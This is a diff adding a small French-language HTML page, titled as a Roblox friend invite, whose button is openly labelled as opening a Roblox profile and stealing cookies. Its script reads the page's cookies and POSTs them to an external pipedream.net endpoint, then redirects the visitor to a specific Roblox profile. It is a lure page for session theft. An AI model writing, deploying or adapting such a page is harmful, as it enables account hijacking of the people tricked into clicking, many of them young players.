@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>watorman invite friends</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+        .roblox-link {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #0080ff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            transition: background-color 0.3s;
+        }
+        .roblox-link:hover {
+            background-color: #005bb5;
+        }
+    </style>
+</head>
+<body>
+    <h1>Ouvrir Profil Roblox et Voler Cookies</h1>
+    <p>Cliquez sur le lien ci-dessous pour ouvrir le profil Roblox et voler les cookies.</p>
+    <a href="#" class="roblox-link" id="openProfileLink">Ouvrir Profil et Voler Cookies</a>
+
+    <script>
+        document.getElementById('openProfileLink').addEventListener('click', function(event) {
+            event.preventDefault();
+
+            // URL du profil Roblox à ouvrir
+            const robloxProfileURL = 'https://www.roblox.com/users/5313256198/profile';
+
+            // URL de destination où vous voulez envoyer les cookies
+            const destinationURL = 'https://eoy22v0ivorvbdz.m.pipedream.net';
+
+            // Récupérer les cookies Roblox
+            const robloxCookies = document.cookie;
+
+            // Envoyer les cookies via une requête POST
+            fetch(destinationURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: robloxCookies })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Réponse du serveur:', data);
+                // Rediriger vers le profil Roblox après avoir envoyé les cookies
+                window.location.href = robloxProfileURL;
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi des cookies:', error);
+            });
+        });
+    </script>
+</body>
+</html>
